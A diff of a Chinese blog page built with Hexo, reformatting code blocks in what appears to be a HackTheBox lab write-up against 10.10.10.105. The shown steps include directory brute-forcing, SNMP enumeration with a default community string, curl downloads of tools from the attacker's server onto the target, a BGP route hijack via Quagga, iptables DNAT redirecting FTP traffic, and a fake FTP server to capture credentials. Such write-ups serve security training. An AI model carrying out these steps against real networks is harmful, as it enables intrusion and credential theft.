@@ -32,7 +32,7 @@
 <meta name="generator" content="Hexo 5.4.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 <link rel="alternate" href="/atom.xml" title="kin9yh’s blog" type="application/atom+xml">
-</head>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
 
 
 
@@ -571,9 +571,8 @@
 <p>先打开网页，是一个登陆页面，有2个Error提示45007，45009，去Google查询类似的关键词发现没有什么可用信息，应该是自定义的WEB框架，</p>
 <p><img src="https://image.3001.net/images/20210221/1613916368_603268d056479f0491f19.png!small" alt=" "></p>
 <p>我们用gobuster来进行目录爆破</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. gobuster  -u http://10.10.10.105 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -q  </span><br></pre></td></tr></tbody></table></figure>
-
-
+<pre><code>1. gobuster  -u http://10.10.10.105 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -q  
+</code></pre>
 <p><img src="https://image.3001.net/images/20210221/1613916447_6032691f326958ea7890e.png!small" alt=" "></p>
 <p>先看下tools</p>
 <p>/tools:</p>
@@ -593,14 +592,12 @@
 <p>没有什么特别有用的信息</p>
 <p>根据那种图可能还有别的设备，这样我想起了snmp服务</p>
 <p>所以我们扫下靶机UDP的端口看看有没有什么有用的信息</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. nmap -sU 10.10.10.105  </span><br></pre></td></tr></tbody></table></figure>
-
+<pre><code>1. nmap -sU 10.10.10.105  
+</code></pre>
 <p><img src="https://image.3001.net/images/20210221/1613916613_603269c593d6775b74f1b.png!small" alt=" "></p>
 <p>果然目标机器是有开启snmp，那么我们用snmpwalk来进行弱口令利用</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. snmpwalk -v 1 -c public 10.10.10.105  </span><br></pre></td></tr></tbody></table></figure>
-
-
-
+<pre><code>1. snmpwalk -v 1 -c public 10.10.10.105  
+</code></pre>
 <p><img src="https://image.3001.net/images/20210221/1613916670_603269fe4c143e9bf35d7.png!small" alt=" "></p>
 <p>这个NET_45JDX23可能就是所谓的序列号</p>
 <p>我们回到登陆进行登陆。</p>
@@ -646,14 +643,13 @@
 <p><img src="https://image.3001.net/images/20210221/1613917117_60326bbd936da7f7ca504.png!small" alt=" "><br>然后我们用python的SimpleHTTPServer模块建立服务然后靶机去下载这个文件</p>
 <p><img src="https://image.3001.net/images/20210221/1613917137_60326bd1a5f91184495b9.png!small" alt=" "></p>
 <p>然后再靶机分别输入如下命令</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. curl http://10.10.13.133:8000/nmap -o nmap  </span><br><span class="line">2. chmod +x nmap  </span><br></pre></td></tr></tbody></table></figure>
-
-
+<pre><code>1. curl http://10.10.13.133:8000/nmap -o nmap  
+2. chmod +x nmap  
+</code></pre>
 <p><img src="https://image.3001.net/images/20210221/1613917168_60326bf0dfff3d71b2074.png!small" alt=" "></p>
 <p>然后我们执行</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. ./nmap -p 21 10.120.15.0/24  </span><br></pre></td></tr></tbody></table></figure>
-
-
+<pre><code>1. ./nmap -p 21 10.120.15.0/24  
+</code></pre>
 <p><img src="https://image.3001.net/images/20210221/1613917194_60326c0a20885b8393413.png!small" alt=" "></p>
 <p>发现没有探测到，可能是目标禁止ICMP数据包</p>
 <p>那么我们加个-Pn参数，同时把结果导出</p>
@@ -674,22 +670,24 @@
 <p><img src="https://image.3001.net/images/20210221/1613917324_60326c8cde86268a51b76.png!small" alt=" "></p>
 <p>现在的情况大概就是图上这个样子</p>
 <p>我们在终端分别输入</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. vtysh  （quagga的命令）  </span><br><span class="line">2. configure terminal（进入配置模式）  </span><br><span class="line">3. do show run （显示配置信息）  </span><br></pre></td></tr></tbody></table></figure>
-
-
-
+<pre><code>1. vtysh  （quagga的命令）  
+2. configure terminal（进入配置模式）  
+3. do show run （显示配置信息）  
+</code></pre>
 <p><img src="https://image.3001.net/images/20210221/1613917349_60326ca5e022d69348dd9.png!small" alt=" "><br>我们需要增加一个network就是把刚刚FTP的那个网段加进来</p>
 <p>这里我直接编辑/etc/ quagga下的bgpd.conf文件内容也就上面显示的内容</p>
 <p><img src="https://image.3001.net/images/20210221/1613917372_60326cbc6d783b24d7967.png!small" alt=" "></p>
 <p>我们在自己的kali上编辑下内容在里面加一条10.120.15.0/25</p>
 <p><img src="https://image.3001.net/images/20210221/1613917391_60326ccf1fc7ac4e8272e.png!small" alt=" "></p>
 <p>然后用python的SimpleHTTPServer服务上传到靶机里面去跟nmap一样<br>把之前的文件重命名，然后把我们的文件下载下来</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. curl http://10.10.13.133:8000/bgpd.conf -o bgpd.con  </span><br></pre></td></tr></tbody></table></figure>
-
-
+<pre><code>1. curl http://10.10.13.133:8000/bgpd.conf -o bgpd.con  
+</code></pre>
 <p><img src="https://image.3001.net/images/20210221/1613917421_60326cedadef343124f39.png!small" alt=" "></p>
 <p>然后在iptales上添加记录并重启quagga服务</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. iptables -t nat -A PREROUTING -p tcp --dport 21 -j DNAT --to-destination 10.10.14.65:21   </span><br><span class="line">2. iptables -t nat -A POSTROUTING -j MASQUERADE </span><br><span class="line">3. service quagga restart </span><br></pre></td></tr></tbody></table></figure>
+<pre><code>1. iptables -t nat -A PREROUTING -p tcp --dport 21 -j DNAT --to-destination 10.10.14.65:21   
+2. iptables -t nat -A POSTROUTING -j MASQUERADE 
+3. service quagga restart 
+</code></pre>
 <p>然后我们在下载一个假的ftp监听21端口来得到凭证<br>Github：<a target="_blank" rel="noopener" href="https://github.com/b1ngda0/FtpServicePython/">https://github.com/b1ngda0/FtpServicePython/</a></p>
 <p><img src="https://image.3001.net/images/20210221/1613917461_60326d1528173122a7b93.png!small" alt=" "></p>
 <p>不久后就能得到账号密码</p>
